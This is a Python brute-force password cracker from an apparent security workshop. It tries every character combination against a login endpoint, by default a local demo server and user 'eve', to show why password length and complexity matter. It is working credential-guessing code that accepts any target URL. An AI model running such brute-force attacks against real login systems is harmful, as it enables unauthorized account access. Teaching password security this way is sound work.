"""
Workshop Brute Force Script (Python)
-------------------------------------
Unlike the wordlist attacker (bruteforce.js), this script tries every possible
combination of characters up to a given length — no wordlist needed.

This demonstrates WHY password complexity and length matter:
  - Short, simple passwords can be cracked in seconds
  - Adding uppercase/digits/symbols explodes the search space exponentially

Usage:
  python3 attacker/bruteforce.py [options]

Options:
  --target         URL of the login endpoint  (default: http://localhost:3001/login)
  --username       Account to attack          (default: eve)
  --local-password Compare against this plaintext locally instead of sending HTTP requests.
                   Much faster — simulates offline cracking after a database leak.
  --maxlen    Max password length to try (default: 3)
  --charset   Character set to use:
                lower   — a-z                (26 chars)
                upper   — A-Z                (26 chars)
                digits  — 0-9               (10 chars)
                symbols — !@#$%^&*()...     (32 chars)
                all     — all of the above  (94 chars)
              Combine with commas, e.g. "lower,digits"  (default: lower,digits,symbols)
  --delay     Milliseconds between requests (default: 0)
"""

import argparse
import itertools
import json
import math
import string
import sys
import time
import urllib.request
import urllib.error

# ── Character set definitions ──────────────────────────────────────────────────

CHARSETS = {
    "lower":   string.ascii_lowercase,          # a-z  (26)
    "upper":   string.ascii_uppercase,          # A-Z  (26)
    "digits":  string.digits,                   # 0-9  (10)
    "symbols": string.punctuation,              # !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~  (32)
    "all":     string.ascii_letters + string.digits + string.punctuation,  # 94
}

# ── Helpers ────────────────────────────────────────────────────────────────────

def build_alphabet(charset_arg: str) -> str:
    seen = set()
    chars = []
    for name in charset_arg.split(","):
        name = name.strip()
        if name == "all":
            return CHARSETS["all"]
        if name not in CHARSETS:
            print(f"[ERROR] Unknown charset '{name}'. Choose from: {', '.join(CHARSETS)}")
            sys.exit(1)
        for c in CHARSETS[name]:
            if c not in seen:
                seen.add(c)
                chars.append(c)
    return "".join(chars)


def total_combinations(alphabet_size: int, max_length: int) -> int:
    """Sum of alphabet^1 + alphabet^2 + ... + alphabet^max_length."""
    return sum(alphabet_size ** l for l in range(1, max_length + 1))


def post_login(url: str, username: str, password: str) -> tuple[int, str]:
    """Send a POST /login request. Returns (status_code, body)."""
    payload = json.dumps({"username": username, "password": password}).encode()
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except urllib.error.URLError as e:
        return 0, str(e.reason)


def fmt_num(n: int) -> str:
    return f"{n:,}"


def fmt_time(seconds: float) -> str:
    if seconds < 60:
        return f"{seconds:.1f}s"
    if seconds < 3600:
        return f"{seconds/60:.1f}m"
    if seconds < 86400:
        return f"{seconds/3600:.1f}h"
    return f"{seconds/86400:.1f}d"


# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Workshop brute force attacker")
    parser.add_argument("--target",          default="http://localhost:3001/login")
    parser.add_argument("--username",        default="eve")
    parser.add_argument("--local-password",  default=None, dest="local_password",
                        help="Compare locally instead of HTTP requests")
    parser.add_argument("--maxlen",          type=int, default=3)
    parser.add_argument("--charset",         default="all")
    parser.add_argument("--delay",           type=int, default=0, help="ms between requests")
    args = parser.parse_args()

    alphabet = build_alphabet(args.charset)
    total    = total_combinations(len(alphabet), args.maxlen)

    print(flush=True)
    print("=== Workshop Brute Force Script (Python) ===", flush=True)
    if args.local_password:
        print(f"  Mode:      LOCAL (offline crack — simulating database leak)", flush=True)
    else:
        print(f"  Target:    {args.target}", flush=True)
    print(f"  Username:  {args.username}", flush=True)
    print(f"  Max length:{args.maxlen}", flush=True)
    print(f"  Charset:   {args.charset}  ({len(alphabet)} chars: {alphabet[:30]}{'...' if len(alphabet) > 30 else ''})", flush=True)
    print(f"  Total combinations to try: {fmt_num(total)}", flush=True)
    print(flush=True)

    # Warn if search space is huge
    if total > 500_000:
        print(f"  ⚠  Search space is {fmt_num(total)} — this may take a very long time.", flush=True)
        print(f"     Consider reducing --maxlen or --charset.", flush=True)
        print(flush=True)

    attempts  = 0
    blocked   = 0
    start     = time.time()

    COLORS = {
        "miss":    "\033[91m",   # red
        "hit":     "\033[92m",   # green
        "blocked": "\033[93m",   # yellow
        "reset":   "\033[0m",
        "dim":     "\033[2m",
    }

    def color(code, text):
        return f"{COLORS[code]}{text}{COLORS['reset']}"

    # In local mode, print a progress update every N misses to avoid flooding
    # the browser with hundreds of thousands of lines.
    # In HTTP mode, every attempt is printed (naturally throttled by network).
    PRINT_EVERY = 500 if args.local_password else 1

    for length in range(1, args.maxlen + 1):
        for combo in itertools.product(alphabet, repeat=length):
            guess    = "".join(combo)
            attempts += 1

            # ── Compare ──────────────────────────────────────────────────────
            if args.local_password:
                is_hit = (guess == args.local_password)
                status = 200 if is_hit else 401
                body   = ""
            else:
                status, body = post_login(args.target, args.username, guess)

            # ── React to result ──────────────────────────────────────────────
            if status == 200:
                elapsed = time.time() - start
                rps     = attempts / elapsed if elapsed > 0 else 0
                print(f"  [HIT]  \"{guess}\" ✓ PASSWORD FOUND!", flush=True)
                print(flush=True)
                print(f"  Attempts: {fmt_num(attempts)} | Speed: {rps:.0f}/s | Elapsed: {fmt_time(elapsed)}", flush=True)
                print(f"  Cracked!  Username: {args.username}   Password: {guess}", flush=True)
                print(flush=True)
                return

            elif status in (429, 403):
                blocked += 1
                print(f"  [BLOCKED] \"{guess}\" → {status}  (blocked: {fmt_num(blocked)})", flush=True)

            elif status == 0:
                print(f"  [ERROR] Could not reach server: {body}", flush=True)
                print("  Is the server running? Try: npm run stage1", flush=True)
                sys.exit(1)

            else:
                # Only print every PRINT_EVERY misses to avoid flooding
                if attempts % PRINT_EVERY == 0:
                    elapsed = time.time() - start
                    rps     = attempts / elapsed if elapsed > 0 else 0
                    eta     = (total - attempts) / rps if rps > 0 else 0
                    print(
                        f"  [MISS]  trying \"{guess}\""
                        f"  — {fmt_num(attempts)}/{fmt_num(total)}"
                        f"  {rps:,.0f}/s  ETA {fmt_time(eta)}",
                        flush=True,
                    )

            if args.delay > 0:
                time.sleep(args.delay / 1000)

    elapsed = time.time() - start
    print(f"\n  Requests: {fmt_num(attempts)} | Blocked: {fmt_num(blocked)} | Elapsed: {fmt_time(elapsed)}")
    print("  Wordspace exhausted. Password not found.")
    print()


if __name__ == "__main__":
    main()
